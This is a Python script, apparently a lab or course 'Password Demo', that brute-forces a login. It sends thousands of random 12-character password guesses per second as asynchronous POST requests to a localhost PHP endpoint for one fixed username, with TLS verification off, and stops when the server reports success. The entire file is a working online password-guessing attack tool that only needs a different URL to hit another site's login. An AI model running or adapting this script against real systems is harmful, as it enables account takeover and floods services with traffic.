import asyncio
import aiohttp
import random
import string
import time
import json


URL = "https://localhost/iasfinal/prep.php"

REQUESTS_PER_SECOND = 10000
TARGET_LENGTH = 12


attempts = 0
stop_requests = False

attempt_lock = asyncio.Lock()



def generate_guess():

    chars = (
        string.ascii_lowercase +
        string.ascii_uppercase +
        string.digits +
        string.punctuation
    )

    return ''.join(
        random.choice(chars)
        for _ in range(TARGET_LENGTH)
    )



async def get_attempt_number():

    global attempts

    async with attempt_lock:

        attempts += 1

        return attempts



async def try_password(session, password):

    attempt_number = await get_attempt_number()


    data = {
        "username": "user_n9odsr - n9odsr@test.com - IT",
        "password": password
    }


    try:

        async with session.post(
            URL,
            json=data,
            ssl=False
        ) as response:


            text = await response.text()

            try:
                result = json.loads(text)
            except Exception:
                print("Server returned:")
                print(text[:500])
                return False


            success = result.get(
                "success",
                False
            )


            print(
                f"[{attempt_number:06}] "
                f"Trying: {password} "
                f"| Success: {success}"
            )


            return success



    except Exception as e:


        print(
            f"[{attempt_number:06}] "
            f"Error:",
            e
        )


        return False




async def keyboard_listener():

    global stop_requests


    while True:

        key = await asyncio.to_thread(input)


        if key.lower() == "n":

            stop_requests = True

            print(
                "\nStopping demo..."
            )

            break




async def main():

    global stop_requests


    characters = (
        string.ascii_lowercase +
        string.ascii_uppercase +
        string.digits +
        string.punctuation
    )


    print("==============================")
    print("Password Demo")
    print("==============================")
    print(
        "Length:",
        TARGET_LENGTH
    )

    print(
        "Characters:",
        len(characters)
    )

    print(
        "\nPress n + ENTER to stop"
    )

    print("==============================\n")



    connector = aiohttp.TCPConnector(
        limit=20
    )


    async with aiohttp.ClientSession(
        connector=connector
    ) as session:



        asyncio.create_task(
            keyboard_listener()
        )


        start_time = time.time()



        while not stop_requests:



            second_start = time.time()


            tasks = []


            for _ in range(
                REQUESTS_PER_SECOND
            ):


                guess = generate_guess()


                tasks.append(
                    try_password(
                        session,
                        guess
                    )
                )



            results = await asyncio.gather(
                *tasks
            )



            if any(results):

                print(
                    "\nPassword matched!"
                )

                stop_requests = True

                break



            elapsed = (
                time.time()
                -
                second_start
            )



            if elapsed < 1:

                await asyncio.sleep(
                    1 - elapsed
                )




    total_time = (
        time.time()
        -
        start_time
    )


    print("\n==============================")

    print(
        "Finished"
    )

    print(
        "Total attempts:",
        attempts
    )


    if total_time > 0:

        print(
            "Average rate:",
            round(
                attempts / total_time,
                2
            ),
            "requests/sec"
        )


    print("==============================")




asyncio.run(main())